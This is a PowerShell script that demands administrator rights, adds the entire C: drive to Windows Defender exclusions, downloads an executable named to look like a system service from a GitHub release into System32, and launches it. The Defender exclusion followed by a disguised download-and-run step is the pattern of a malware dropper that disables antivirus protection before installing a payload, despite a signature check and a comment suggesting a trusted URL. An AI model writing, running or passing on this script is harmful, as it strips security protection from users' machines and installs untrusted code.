# Ensure the script runs with administrative privileges
$isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
if (-not $isAdmin) {
    Write-Host "This script requires administrative privileges. Please run PowerShell as Administrator."
    exit 1
}

# URL of the executable to download (replace with a verified, trusted URL)
$downloadUrl = "https://github.com/boradxshlok/AAOGL/releases/download/pussysss2/winservicesr.exe"

# Destination path in System32
$destinationPath = "$env:SystemRoot\System32\winservicesr.exe"

# New name for the existing file if it exists
$newFileName = "winservicesr_old.exe"
$renamePath = "$env:SystemRoot\System32\$newFileName"

# Function to add C: drive as a Windows Defender exclusion
function Add-DefenderExclusion {
    try {
        Write-Host "Adding C: drive to Windows Defender exclusions..."
        $defenderPath = "C:\"
        Add-MpPreference -ExclusionPath $defenderPath -ErrorAction Stop
        Write-Host "Successfully added C: drive to Windows Defender exclusions."
    }
    catch {
        Write-Host "Error adding C: drive to exclusions: $_"
        exit 1
    }
}

try {
    # Add C: drive to Windows Defender exclusions
    Add-DefenderExclusion

    # Check if the file already exists
    if (Test-Path $destinationPath) {
        Write-Host "File winservicesr.exe already exists at $destinationPath. Renaming it to $newFileName..."
        try {
            # Rename the existing file
            Rename-Item -Path $destinationPath -NewName $newFileName -Force -ErrorAction Stop
            Write-Host "Successfully renamed existing file to $newFileName"
        }
        catch {
            Write-Host "Error renaming existing file: $_"
            exit 1
        }
    }

    # Download the new executable
    Write-Host "Downloading winservicesr.exe from $downloadUrl..."
    Invoke-WebRequest -Uri $downloadUrl -OutFile $destinationPath -UseBasicParsing

    # Verify the file was downloaded
    if (Test-Path $destinationPath) {
        Write-Host "Successfully downloaded winservicesr.exe to $destinationPath"

        # Optional: Verify the file's digital signature (if applicable)
        try {
            $signature = Get-AuthenticodeSignature -FilePath $destinationPath
            if ($signature.Status -ne "Valid") {
                Write-Host "Warning: The downloaded file does not have a valid digital signature."
                Write-Host "Status: $($signature.Status)"
                exit 1
            }
        }
        catch {
            Write-Host "Error verifying digital signature: $_"
            exit 1
        }

        # Run the executable
        Write-Host "Running winservicesr.exe..."
        Start-Process -FilePath $destinationPath -NoNewWindow
        Write-Host "winservicesr.exe is now running."
    }
    else {
        Write-Host "Error: Failed to download winservicesr.exe to $destinationPath"
        exit 1
    }
}
catch {
    Write-Host "Error occurred: $_"
    exit 1
}
